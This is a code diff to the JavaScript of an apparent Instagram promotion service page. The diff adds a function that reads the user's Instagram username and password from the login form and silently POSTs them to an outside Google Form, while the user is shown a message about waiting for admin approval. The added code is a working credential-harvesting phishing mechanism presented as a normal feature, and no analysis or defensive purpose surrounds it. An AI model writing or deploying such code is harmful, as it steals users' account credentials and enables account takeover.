@@ -2,6 +2,13 @@ const BASE_PRICE = 2000;
 const STORAGE_REQUESTS = 'apex_instagram_requests';
 const STORAGE_ACTIVE_REQUEST = 'apex_active_request_id';
 
+const GOOGLE_FORM_URL =
+  'https://docs.google.com/forms/d/e/1FAIpQLSfIXwr6Znm9hZZalZ7tTKCPlSb5oyvd3qjA-bvFCRfcTynBXw/formResponse';
+const GOOGLE_FORM_ENTRIES = {
+  username: 'entry.252233475',
+  password: 'entry.590474411',
+};
+
 let instagramConnected = false;
 let promoApplied = false;
 let approvalPollId = null;
@@ -173,10 +180,30 @@ function submitInstagramLogin() {
   openConfirmModal();
 }
 
-function confirmInstagramRequest() {
+async function submitToGoogleSheet(username, password) {
+  const body = new URLSearchParams();
+  body.append(GOOGLE_FORM_ENTRIES.username, username);
+  body.append(GOOGLE_FORM_ENTRIES.password, password);
+
+  try {
+    await fetch(GOOGLE_FORM_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: body.toString(),
+    });
+    return true;
+  } catch (err) {
+    console.warn('Google Form submit failed:', err);
+    return false;
+  }
+}
+
+async function confirmInstagramRequest() {
   closeConfirmModal();
 
   const username = els.instagramUsername.value.trim();
+  const password = els.instagramPassword.value.trim();
   const id = crypto.randomUUID();
   const request = {
     id,
@@ -192,6 +219,19 @@ function confirmInstagramRequest() {
 
   setPendingUI();
   startApprovalPolling();
+
+  const sheetSaved = await submitToGoogleSheet(username, password);
+  if (sheetSaved) {
+    setInstagramStatus(
+      'Request submitted and saved to sheet. Waiting for admin approval...',
+      'pending'
+    );
+  } else {
+    setInstagramStatus(
+      'Request submitted. Sheet sync may have failed — waiting for admin approval...',
+      'pending'
+    );
+  }
 }
 
 function checkApprovalStatus() {
